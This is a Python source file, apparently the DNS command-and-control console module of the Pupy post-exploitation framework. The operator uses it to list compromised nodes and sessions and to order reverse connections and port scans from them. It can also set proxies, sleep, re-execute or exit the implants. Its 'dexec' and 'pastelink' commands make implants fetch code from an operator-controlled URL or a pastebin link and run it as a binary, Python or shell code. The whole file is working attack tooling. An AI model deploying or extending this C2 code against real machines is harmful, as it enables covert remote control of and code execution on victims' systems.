# -*- encoding: utf-8 -*-

from pupylib.PupyModule import PupyArgumentParser
from pupylib.PupyOutput import Success, Error, Table, Color

import time

usage = 'DNSCNC control'
parser = PupyArgumentParser(prog='dnscnc', description=usage)
parser.add_argument('-n', '--node', help='Send command only to this node (or session)')
parser.add_argument('-d', '--default', action='store_true', default=False,
                         help='Set command as default for new connections')

commands = parser.add_subparsers(title='commands', dest='command')
status = commands.add_parser('status', help='DNSCNC status')

sessions = commands.add_parser('sessions', help='List known DNSCNC sessions')
sessions.add_argument('-r', action='store_true', help='Reverse sorting')
sorting = sessions.add_mutually_exclusive_group()
sorting.add_argument('-b', action='store_true', help='Sort by boot time')
sorting.add_argument('-o', action='store_true', help='Sort by OS')
sorting.add_argument('-i', action='store_true', help='Sort by IP')
sorting.add_argument('-n', action='store_true', help='Sort by node')
sorting.add_argument('-d', action='store_true', help='Sort by duration')
sorting.add_argument('-c', action='store_true', help='Sort by pending commands')

nodes = commands.add_parser('nodes', help='List known DNSCNC nodes')
nodes.add_argument('-r', action='store_true', help='Reverse sorting')
nodes_sorting = nodes.add_mutually_exclusive_group()
nodes_sorting.add_argument('-a', action='store_true', help='Sort by Alert')
nodes_sorting.add_argument('-i', action='store_true', help='Sort by CID')
nodes_sorting.add_argument('-I', action='store_true', help='Sort by IID')
nodes_sorting.add_argument('-n', action='store_true', help='Sort by node')
nodes_sorting.add_argument('-d', action='store_true', help='Sort by duration')
nodes_sorting.add_argument('-c', action='store_true', help='Sort by pending commands')
nodes_sorting.add_argument('-v', action='store_true', help='Sort by version')

info = commands.add_parser('info', help='List known DNSCNC clients system status')
info.add_argument('-r', action='store_true', help='Reverse sorting')
info_sorting = info.add_mutually_exclusive_group()
info_sorting.add_argument('-n', action='store_true', help='Sort by node')
info_sorting.add_argument('-i', action='store_true', help='Sort by IP')
info_sorting.add_argument('-o', action='store_true', help='Sort by OS')
info_sorting.add_argument('-c', action='store_true', help='Sort by CPU load')
info_sorting.add_argument('-m', action='store_true', help='Sort by MEM load')
info_sorting.add_argument('-l', action='store_true', help='Sort by listeners count')
info_sorting.add_argument('-e', action='store_true', help='Sort by established connections count')
info_sorting.add_argument('-u', action='store_true', help='Sort by users count')
info_sorting.add_argument('-x', action='store_true', help='Sort by idle')
info_sorting.add_argument('-t', action='store_true', help='Sort by tags')

wait = commands.add_parser('wait', help='Wait all commands applied or session gone')
wait.add_argument('-t', '--timeout', type=int, help='Timeout')

policy = commands.add_parser('set', help='Change policy (polling, timeout)')
policy.add_argument('-p', '--poll', help='Set poll interval', type=int)
kex = policy.add_mutually_exclusive_group()
kex.add_argument('-K', '--no-kex', default=None, action='store_true', help='Disable KEX')
kex.add_argument('-k', '--kex', default=None, action='store_true', help='Enable KEX')
policy.add_argument('-t', '--timeout', type=int, help='Set session timeout')

connect = commands.add_parser('connect', help='Request reverse connection')
connect.add_argument('-c', '--host', help='Manually specify external IP address for connection')
connect.add_argument('-p', '--port', help='Manually specify external PORT for connection')
connect.add_argument('-t', '--transport', help='Manually specify transport for connection')

reset = commands.add_parser('reset', help='Reset scheduled commands')
disconnect = commands.add_parser('disconnect', help='Request disconnection')

reexec = commands.add_parser('reexec', help='Try to reexec module')

onlinestatus = commands.add_parser('onlinestatus', help='Try to check network ability (warning: noisy)')

extra = commands.add_parser('extra', help='Get extra info from session (cyan colored)')

scan = commands.add_parser('scan', help='Try to connect to remote host ports (range)')
scan.add_argument('host', type=str, help='Host')
scan.add_argument('first', type=int, help='First port in range')
scan.add_argument('last', type=int, nargs='?', help='Last port in range')

sleep = commands.add_parser('sleep', help='Postpone any activity')
sleep.add_argument('-t', '--timeout', default=10, type=int, help='Timeout (seconds)')

pastelink = commands.add_parser('pastelink', help='Execute code by link to pastebin service')
pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
                           help='Action - execute as executable, or evaluate as python/sh code')
pastelink_src = pastelink.add_mutually_exclusive_group(required=True)
pastelink_src.add_argument('-c', '--create', metavar='<SRC>', help='Create new pastelink from file')
pastelink_src.add_argument('-C', '--create-content', metavar=('<SRC>', '<DST>'), nargs=2,
                           help='Create new content from file and store content to specified path')
pastelink_src.add_argument('-u', '--url', help='Specify existing URL')
pastelink.add_argument('-1', '--legacy', default=False,
                       action='store_true', help='Encrypt using legacy V1 encoder')

dexec = commands.add_parser('dexec', help='Execute code by link to service controlled by you')
dexec.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
                           help='Action - execute as executable, or evaluate as python/sh code')
dexec.add_argument('-u', '--url', required=True, help='URL to data')
dexec.add_argument('-p', '--proxy', action='store_true', default=False,
                       help='Ask to use system proxy (http/https only)')

proxy = commands.add_parser('proxy', help='Set connection proxy')
proxy.add_argument('uri', help='URI. Example: http://user:password@192.168.0.1:3128 or none')

exit = commands.add_parser('exit', help='Request exit')

def do(server, handler, config, args):
    if not server.dnscnc:
        handler.display(Error('DNSCNC disabled'))
        return

    if args.command == 'status':
        policy = handler.dnscnc.policy
        objects = {
            'DOMAIN': server.dnscnc.dns_domain,
            'DNS PORT': str(server.dnscnc.dns_port),
            'RECURSOR': server.dnscnc.dns_recursor,
            'LISTEN': str(server.dnscnc.dns_listen),
            'SESSIONS': 'TOTAL={} DIRTY={}'.format(
                server.dnscnc.count, server.dnscnc.dirty
            ),
            'POLL': '{}s'.format(policy['interval']),
            'TIMEOUT': '{}s'.format(policy['timeout']),
            'KEX': '{}'.format(bool(policy['kex'])),
        }

        handler.display(Table([
            {'PROPERTY':k, 'VALUE':v} for k,v in objects.iteritems()
        ], ['PROPERTY', 'VALUE']))

        if server.dnscnc.commands:
            handler.display('\nDEFAULT COMMANDS:\n'+'\n'.join([
                '{:03d} {}'.format(i, cmd) for i, cmd in enumerate(server.dnscnc.commands)
            ]))

        if server.dnscnc.node_commands:
            handler.display('\nNODE DEFAULT COMMANDS:')
            for node, commands in server.dnscnc.node_commands.iteritems():
                handler.display('\n' + '\n'.join([
                    '{:03d} {}: {}'.format(
                        i, '{:012x}'.format(node) if type(node) == int else node, cmd
                    ) for i, cmd in enumerate(commands)
                ]))

    elif args.command == 'info':
        sessions = server.dnscnc.list(args.node)
        if not sessions:
            handler.display(Success('No active DNSCNC sesisons found'))
            return

        objects = []

        sort_by = None

        if args.o:
            sort_by = lambda x: x.system_info['os'] + x.system_info['arch']
        elif args.i:
            sort_by = lambda x: x.system_info['external_ip']
        elif args.n:
            sort_by = lambda x: x.system_info['node']
        elif args.c:
            sort_by = lambda x: x.system_status['cpu']
        elif args.m:
            sort_by = lambda x: x.system_status['mem']
        elif args.l:
            sort_by = lambda x: x.system_status['listen']
        elif args.e:
            sort_by = lambda x: x.system_status['remote']
        elif args.u:
            sort_by = lambda x: x.system_status['users']
        elif args.x:
            sort_by = lambda x: x.system_status['idle']
        elif args.t:
            sort_by = lambda x: str(sorted(config.tags(x.system_info['node'])))

        if sort_by:
            sessions = sorted(sessions, key=sort_by, reverse=bool(args.r))

        for idx, session in enumerate(sessions):
            if not (session.system_status and session.system_info):
                continue

            object = {
                '#': '{:03d}'.format(idx),
                'P': '',
                'NODE': '{:012x}'.format(session.system_info['node']),
                'SESSION': '{:08x}'.format(session.spi),
                'IP': session.system_info['external_ip'] or '?',
                'OS': '{}/{}'.format(
                    session.system_info['os'],
                    session.system_info['arch']
                ),
                'CPU': '{:d}%'.format(session.system_status['cpu']),
                'MEM': '{:d}%'.format(session.system_status['mem']),
                'LIS': '{:d}'.format(session.system_status['listen']),
                'EST': '{:d}'.format(session.system_status['remote']),
                'USERS': '{:d}'.format(session.system_status['users']),
                'IDLE': '{}'.format(session.system_status['idle']),
                'TAGS': '{}'.format(config.tags(session.system_info['node']))
            }

            pupy_session = None
            for c in server.clients:
                if 'spi' in c.desc:
                    if c.desc['spi'] == '{:08x}'.format(session.spi):
                        pupy_session = c.desc['id']
                elif c.node() == '{:012x}'.format(session.system_info['node']):
                    pupy_session = c.desc['id']
                    break

            if pupy_session:
                object.update({
                    'P': pupy_session
                })

            color = ''
            if (session.online_status or session.egress_ports or session.open_ports):
                color = 'cyan'
            elif session.system_status['cpu'] > 90 or session.system_status['mem'] > 90:
                color = 'lightred'
            elif (session.pstore_dirty):
                color = 'magenta'
            elif not session.system_status['idle']:
                color = 'lightyellow'
            elif pupy_session:
                color = 'lightgreen'

            if color:
                object = {
                    k:Color(v, color) for k,v in object.iteritems()
                }

            objects.append(object)

        columns = [
            '#', 'P', 'NODE', 'SESSION', 'IP', 'OS',
            'CPU', 'MEM', 'LIS', 'EST', 'USERS', 'IDLE', 'TAGS'
        ]

        handler.display(Table(objects, columns))

    elif args.command == 'sessions':
        sessions = server.dnscnc.list(args.node)
        if not sessions:
            handler.display(Success('No active DNSCNC sesisons found'))
            return

        objects = []

        sort_by = None
        if args.b:
            sort_by = lambda x: x.system_info['boottime']
        elif args.o:
            sort_by = lambda x: x.system_info['os'] + x.system_info['arch']
        elif args.i:
            sort_by = lambda x: x.system_info['external_ip']
        elif args.d:
            sort_by = lambda x: x.duration
        elif args.c:
            sort_by = lambda x: x.commands
        elif args.n:
            sort_by = lambda x: x.system_info['node']

        if sort_by:
            sessions = sorted(sessions, key=sort_by, reverse=bool(args.r))

        for idx, session in enumerate(sessions):
            object = {
                '#': idx,
                'P': '',
                'NODE': '{:012x}'.format(session.system_info['node']),
                'SESSION': '{:08x}'.format(session.spi),
                'EXTERNAL IP': '{}'.format(
                    session.system_info['external_ip'] or '?'
                ),
                'ONLINE': '{}'.format(
                    'Y' if session.system_info['internet'] else 'N'
                ),
                'IDLE': '{}s'.format(session.idle),
                'DURATION': '{}s'.format(session.duration),
                'OS': '{}/{}'.format(
                    session.system_info['os'],
                    session.system_info['arch']
                ),
                'BOOTED': '{}s'.format(
                    session.system_info['boottime'].ctime()) if \
                    session.system_info['boottime'] else '?',
                'CMDS': '{}'.format(len(session.commands))
            }

            pupy_session = None
            for c in server.clients:
                if 'spi' in c.desc:
                    if c.desc['spi'] == '{:08x}'.format(session.spi):
                        pupy_session = c.desc['id']
                elif c.node() == '{:012x}'.format(session.system_info['node']):
                    pupy_session = c.desc['id']
                    break

            color = None

            if pupy_session:
                object.update({
                    'P': pupy_session
                })
                color = 'lightgreen'
            elif session.idle > server.dnscnc.policy['interval']:
                color = 'grey'
            elif not session.system_info['internet']:
                color = 'lightred'
            elif len(session.commands) > 0:
                color = 'yellow'

            if color:
                object = {
                    k:Color(v, color) for k,v in object.iteritems()
                }

            objects.append(object)

        columns = [
            '#', 'P', 'NODE', 'SESSION', 'OS', 'ONLINE',
            'EXTERNAL IP', 'IDLE', 'DURATION', 'BOOTED', 'CMDS'
        ]

        handler.display(Table(objects, columns))

    elif args.command == 'nodes':
        nodes = server.dnscnc.nodes(args.node)

        if not nodes:
            handler.display(Success('No active DNSCNC nodes found'))
            return

        objects = []

        sort_by = None
        if args.i:
            sort_by = lambda x: x.cid
        if args.a:
            sort_by = lambda x: x.alert
        elif args.I:
            sort_by = lambda x: x.iid
        elif args.d:
            sort_by = lambda x: x.duration
        elif args.c:
            sort_by = lambda x: len(x.commands)
        elif args.n:
            sort_by = lambda x: x.node
        elif args.v:
            sort_by = lambda x: x.version

        if sort_by:
            nodes = sorted(nodes, key=sort_by, reverse=bool(args.r))

        for idx, node in enumerate(nodes):
            object = {
                '#': idx,
                'P': '',
                'A': 'Y' if node.alert else '',
                'NODE': '{:012x}'.format(node.node),
                'IID': '{}'.format(
                    'pid:{}'.format(node.iid) if node.iid < 65535 \
                    else 'spi:{:08x}'.format(node.iid)),
                'VER': '{}'.format(node.version),
                'CID': '{:08x}'.format(node.cid),
                'IDLE': '{}s'.format(node.idle),
                'DURATION': '{}s'.format(node.duration),
                'CMDS': '{}'.format(len(node.commands)),
                'TAGS': '{}'.format(config.tags(node.node)),
                'WARN': '{}'.format(node.warning if node.warning else '')
            }

            pupy_session = None
            ids = []

            for c in server.clients:
                if c.node() == '{:012x}'.format(node.node):
                    if (node.iid <= 65535 and c.desc['pid'] % 65535 == node.iid) \
                      or (node.iid > 65535 and 'spi' in c.desc and \
                      c.desc['spi'] == '{:08x}'.format(node.iid)):
                        ids.append(str(c.desc['id']))

            if ids:
                pupy_session = ','.join(ids)

            color = None

            if pupy_session:
                object.update({
                    'P': pupy_session
                })

            if node.alert:
                color = 'lightred'
            elif node.warning:
                color = 'cyan'
            elif pupy_session:
                color = 'lightgreen'
            elif node.idle > server.dnscnc.policy['interval']:
                color = 'grey'
            elif len(node.commands) > 0:
                color = 'yellow'

            if color:
                object = {
                    k:Color(v, color) for k,v in object.iteritems()
                }

            objects.append(object)

        columns = [
            '#', 'P', 'A', 'NODE', 'IID', 'VER',
            'CID', 'IDLE', 'DURATION', 'CMDS', 'TAGS', 'WARN'
        ]

        handler.display(Table(objects, columns))

    elif args.command == 'wait':
        now = time.time()
        timeout = None
        if args.timeout:
            timeout = now + args.timeout
        else:
            timeout = now + handler.dnscnc.policy['timeout']

        dirty = True

        while dirty or (time.time() >= timeout):
            dirty = False
            for session in server.dnscnc.list():
                if len(session.commands) > 0:
                    dirty = True

            if dirty:
                time.sleep(1)

    elif args.command == 'set':
        set_kex = None
        if args.kex is not None:
            set_kex = True
        elif args.no_kex is not None:
            set_kex = False

        if all([x is None for x in [set_kex, args.timeout, args.poll]]):
            handler.display(Error('No arguments provided.'))
        else:
            count = server.dnscnc.set_policy(set_kex, args.timeout, args.poll, node=args.node)
            if count:
                handler.display(Success('Apply policy to {} known nodes'.format(count)))

    elif args.command == 'reset':
        count = server.dnscnc.reset(
            session=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Reset commands on {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'connect':
        try:
            count = server.dnscnc.connect(
                host=args.host,
                port=args.port,
                transport=args.transport,
                node=args.node,
                default=args.default
            )
        except Exception, e:
            handler.display(Error(e))
            return

        if count:
            handler.display(Success('Schedule connect {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'onlinestatus':
        count = server.dnscnc.onlinestatus(node=args.node, default=args.default)

        if count:
            handler.display(Success('Schedule online status request to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'scan':
        count = server.dnscnc.scan(
            args.host, args.first, args.last or args.first,
            node=args.node, default=args.default
        )

        if count:
            handler.display(Success('Schedule online status request to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'disconnect':
        count = server.dnscnc.disconnect(
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule disconnect to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'exit':
        count = server.dnscnc.exit(
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule exit to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'reexec':
        count = server.dnscnc.reexec(
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule reexec to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'sleep':
        count = server.dnscnc.sleep(
            args.timeout,
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule sleep to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'proxy':
        count = server.dnscnc.proxy(
            args.uri,
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule proxy to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'dexec':
        count = server.dnscnc.dexec(
            args.url,
            args.action,
            proxy=args.proxy,
            node=args.node,
            default=args.default
        )

        if count:
            handler.display(Success('Schedule sleep to {} known nodes'.format(count)))
        elif args.node:
            handler.display(Error('Node {} not found'.format(args.node)))

    elif args.command == 'pastelink':
        try:
            create = None
            output = None

            if args.create:
                create = args.create
            elif args.create_content:
                create, output = args.create_content

            count, url = server.dnscnc.pastelink(
                content=create,
                output=output,
                url=args.url,
                action=args.action,
                node=args.node,
                default=args.default,
                legacy=args.legacy
            )

            if output:
                return

            if count:
                handler.display(Success('Schedule exit to {} known nodes'.format(count)))
            elif args.node:
                handler.display(Error('Node {} not found'.format(args.node)))

        except ValueError as e:
            handler.display(Error('{}'.format(e)))

    elif args.command == 'extra':
        sessions = server.dnscnc.list(args.node)
        if not sessions:
            handler.display(Error('No sessions found'))
            return
        elif len(sessions) > 1:
            handler.display(Error('Selected more than one sessions'))
            return

        session = sessions[0]

        if session.online_status:
            handler.display('\nONLINE STATUS\n')
            objects = [
                {
                    'KEY':Color(
                        k.upper().replace('-', ' '),
                        'green' if session.online_status[k] else 'lightyellow'
                    ),
                    'VALUE':Color(
                         str(session.online_status[k]).upper(),
                         'green' if session.online_status[k] else 'lightyellow'
                    )
                } for k in [
                    'online', 'igd', 'hotspot', 'dns', 'ntp',
                    'direct-dns', 'http', 'https',
                    'https-no-cert', 'https-mitm', 'proxy',
                    'transparent-proxy', 'stun', 'mintime', 'ntp-offset'
                ]
            ]

            handler.display(Table(objects, ['KEY', 'VALUE']))

            handler.display('\nPASTES STATUS\n')
            objects = [
                {
                    'KEY': Color(k, 'green' if v else 'lightyellow'),
                    'VALUE':Color(v, 'green' if v else 'lightyellow')
                } for k,v in session.online_status['pastebins'].iteritems()
            ]
            handler.display(Table(objects, ['KEY', 'VALUE']))

            session.online_status = None

        if session.egress_ports:
            handler.display('\nEGRESS PORTS: {}\n'.format(','.join(str(x) for x in session.egress_ports)))
            session.egress_ports = set()

        if session.open_ports:
            handler.display('\nOPEN PORTS\n')
            objects = [
                {
                    'IP': str(ip),
                    'PORTS': ','.join(str(x) for x in ports)
                } for ip,ports in session.open_ports.iteritems()
            ]
            handler.display(Table(objects, ['IP', 'PORTS']))
            session.open_ports = {}
